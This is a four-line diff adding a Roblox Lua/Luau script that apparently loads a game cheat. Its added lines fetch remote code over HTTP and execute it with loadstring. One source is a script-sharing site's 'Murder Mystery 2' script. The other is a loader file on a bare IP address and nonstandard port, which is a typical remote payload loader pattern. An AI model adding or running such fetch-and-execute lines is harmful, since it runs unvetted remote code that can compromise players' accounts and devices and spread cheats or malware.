@@ -1,0 +1,4 @@
+ID="b047f7f2-bde8-4497-b6ee-43affe01cd98";
+RUN_AFTER=loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Murder-Mystery-2-Script-80327"))()
+
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
